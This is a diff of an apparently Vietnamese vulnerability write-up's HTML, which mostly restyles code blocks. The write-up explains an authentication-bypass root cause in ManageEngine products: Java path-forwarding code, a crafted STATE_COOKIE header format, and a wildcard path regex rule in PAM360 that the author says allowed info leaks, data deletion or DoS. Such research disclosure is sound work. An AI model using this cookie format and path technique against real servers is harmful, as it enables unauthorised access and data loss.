+</span></span><span style="display:flex;"><span>                forwardPath <span style="color:#f92672">=</span> forwardPath<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span>path<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>index <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                forwardPath <span style="color:#f92672">=</span> forwardPath<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span>index<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> forwardPath<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><ul>
 <li>[1]: thực hiện parse State Cookie. Để tránh request lỗi, cookie cần có định dạng như sau: <code>Cookie: STATE_COOKIE=&amp;_REQS/_TIME/1993/;</code></li>
 <li>[2]: lấy forwardPath, cơ bản là cắt bỏ phần prefix <code>/STATE_ID/&lt;id&gt;</code>. Ví dụ <code>/STATE_ID/1/api/v3/</code> sẽ trở thành <code>/api/v3/</code></li>
 <li>[3]: Forward đến servlet</li>
@@ -510,11 +510,11 @@ Cookie: STATE_COOKIE=&amp;_REQS/_TIME/1993/; &lt;truncated&gt;
 </code></pre><h2 id="others">Others</h2>
 <p>Một số products khác của ManageEngine cũng bị ảnh hưởng với root-cause tương tự khi tồn tại ActionRule có path regex không bị prefix.</p>
 <p>Với PAM360 - hay trước đây còn là Password Manager Pro:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;regexes&gt;
-    &lt;regex name=&#34;meagentacceptall&#34; value=&#34;.*&#34;/&gt;
-&lt;/regexes&gt;
-&lt;url path=&#34;/${meagentacceptall}/me-agent/${meagentacceptall}&#34; method=&#34;get&#34; threshold=&#34;30&#34; duration=&#34;1&#34; lock-period=&#34;5&#34; &gt;
-</code></pre><p>Tức path regex sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;regexes&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;regex</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;meagentacceptall&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;.*&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/regexes&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/${meagentacceptall}/me-agent/${meagentacceptall}&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;get&#34;</span> <span style="color:#a6e22e">threshold=</span><span style="color:#e6db74">&#34;30&#34;</span> <span style="color:#a6e22e">duration=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">lock-period=</span><span style="color:#e6db74">&#34;5&#34;</span> <span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Tức path regex sẽ là:</p>
 <pre tabindex="0"><code>/.*/me-agent/.*
 </code></pre><p>Nhưng tương tự với AssetExplorer, rule này yêu cầu request phải được xác thực và không cho phép truyền param - khiến attack surface bị giới hạn. PAM360 có khá nhiều servlet với wildcard mapping, nhưng với giới hạn trên, PoC mình chỉ dừng lại ở info leaks, xóa 1 phần data hoặc DoS - vendor đã fix nhưng không đánh mã CVE.</p>
 <p>Một số products khác thì mình chưa tìm ra được impact cụ thể vì các giới hạn cũng như trên.</p>
